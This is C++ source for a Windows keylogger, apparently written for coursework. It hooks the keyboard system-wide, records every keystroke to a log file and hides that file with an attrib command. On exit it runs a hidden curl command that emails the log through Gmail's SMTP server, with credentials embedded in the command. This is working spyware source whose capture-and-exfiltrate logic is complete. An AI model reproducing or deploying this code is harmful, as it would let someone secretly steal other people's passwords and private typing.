#include <string>
#include "framework.h"
#include "cppKL.h"
#include <locale.h>
#include <string.h>
#include <fstream>
#include <Windows.h>


#define SIZE_STR 1 << 8
#define PATH L"log.log"
#define ENG 0x0409

static bool flag = false;
HHOOK hHook;

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(const wchar_t* wstr);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	HANDLE hMutex;
	hMutex = CreateMutex(NULL, TRUE, L"test_keylogger");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		MessageBox(NULL, L"Already open!.", L"Start", MB_OK);
		return 0;
	}

	if (MessageBox(NULL, L"Wanna start?", L"Start", MB_YESNO | MB_ICONQUESTION) != IDYES)
		return 0;

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		LogKey, NULL, NULL);

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0) && flag == false)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}


	return 0;
}

BOOL IsCaps(void)
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

BOOL isNumLock(void)
{
	if ((GetKeyState(VK_NUMLOCK) & 0x0001) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	bool nStart = true;
	if (wParam == WM_KEYDOWN)
	{
		if (nStart) {
			char command[] = "attrib +h \"log.log\"";
			WinExec(command, SW_HIDE);
			nStart = false;
		}
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameText(iKey, wstr, SIZE_STR);



		if (wcslen(wstr) > 1)
		{

			switch (pHook->vkCode)
			{
			case 13:
				WriteToFile(L"[Enter]");
				break;
			case 111:
				WriteToFile(L"/");
				break;
			case 106:
				WriteToFile(L"*");
				break;
			default:
				break;
			}

			if (isNumLock() == TRUE && pHook->vkCode > 95 && pHook->vkCode < 111)
			{
				iKey >>= 16;

				switch (pHook->vkCode)
				{
				case 96:
					WriteToFile(L"0");
					break;
				case 97:
					WriteToFile(L"1");
					break;
				case 98:
					WriteToFile(L"2");
					break;
				case 99:
					WriteToFile(L"3");
					break;
				case 100:
					WriteToFile(L"4");
					break;
				case 101:
					WriteToFile(L"5");
					break;
				case 102:
					WriteToFile(L"6");
					break;
				case 103:
					WriteToFile(L"7");
					break;
				case 104:
					WriteToFile(L"8");
					break;
				case 105:
					WriteToFile(L"9");
					break;
				case 110:
					WriteToFile(L".");
					break;

				default:
					break;
				}

			}
			else
			{
				switch (pHook->vkCode)
				{
				case 96:
					WriteToFile(L"[Insert]");
					break;
				case 110:
					WriteToFile(L"[Delete]");
					break;
				default:
					break;
				}

				WriteToFile(L"[");
				WriteToFile(wstr);
				WriteToFile(L"]");
			}

		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '`':
					WriteToFile(L"~");
					break;
				case '1':
					WriteToFile(L"!");
					break;
				case '2':
					WriteToFile(L"@");
					break;
				case '3':
					WriteToFile(L"#");
					break;
				case '4':
					WriteToFile(L"$");
					break;
				case '5':
					WriteToFile(L"%");
					break;
				case '6':
					WriteToFile(L"^");
				case '7':
					WriteToFile(L"&");
					break;
				case '8':
					WriteToFile(L"*");
					break;
				case '9':
					WriteToFile(L"(");
					break;
				case '0':
					WriteToFile(L")");
					break;
				case '-':
					WriteToFile(L"_");
					break;
				case '=':
					WriteToFile(L"+");
					break;

				default:
					WriteToFile(wstr);
					break;
				}
			}
			else
			{
				if (GetKeyState(0x7b) == true)
				{
					if (IDYES == MessageBox(NULL, L"Exit?", L"Вихід", MB_YESNO | MB_ICONQUESTION))
					{
						flag = true;
						UnhookWindowsHookEx(hHook);

						char command[] = "curl smtp://smtp.gmail.com:587 -v --mail-from \"rroma5129@gmail.com\" --mail-rcpt \"testmailforcoursework@gmail.com\" --ssl -u rroma5129@gmail.com:####pand####porv -T \"log.log\" -k --anyauth";
						WinExec(command, SW_HIDE);

						return 0;
					}

				}


				wstr[0] = tolower(wstr[0]);
				WriteToFile(wstr);
			}
		}
		free(wstr);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(const wchar_t* wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

